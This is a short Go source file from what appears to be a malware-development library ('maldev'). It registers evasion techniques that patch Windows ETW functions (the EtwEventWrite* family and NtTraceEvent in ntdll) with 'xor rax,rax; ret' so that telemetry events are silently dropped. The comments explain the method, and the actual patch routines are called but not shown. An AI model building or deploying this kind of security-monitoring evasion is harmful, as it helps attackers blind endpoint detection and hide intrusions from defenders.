//go:build windows

package etw

import "github.com/oioio-space/maldev/evasion"

type patchTechnique struct{}

func (patchTechnique) Name() string                  { return "etw:Patch" }
func (patchTechnique) Apply(c evasion.Caller) error  { return Patch(evasion.AsCaller(c)) }

// PatchTechnique returns a Technique that patches all 5 EtwEventWrite* functions.
// How it works: overwrites each function entry with xor rax,rax; ret (4 bytes).
// ETW events are then silently dropped. Missing functions are skipped.
func PatchTechnique() evasion.Technique { return patchTechnique{} }

type ntTraceTechnique struct{}

func (ntTraceTechnique) Name() string                  { return "etw:NtTraceEvent" }
func (ntTraceTechnique) Apply(c evasion.Caller) error  { return PatchNtTraceEvent(evasion.AsCaller(c)) }

// NtTraceTechnique returns a Technique that patches NtTraceEvent in ntdll.
// How it works: same xor rax,rax; ret patch on the ntdll-level trace function.
func NtTraceTechnique() evasion.Technique { return ntTraceTechnique{} }

type allTechnique struct{}

func (allTechnique) Name() string                  { return "etw:All" }
func (allTechnique) Apply(c evasion.Caller) error  { return PatchAll(evasion.AsCaller(c)) }

// All returns a Technique that patches all ETW functions including NtTraceEvent.
func All() evasion.Technique { return allTechnique{} }
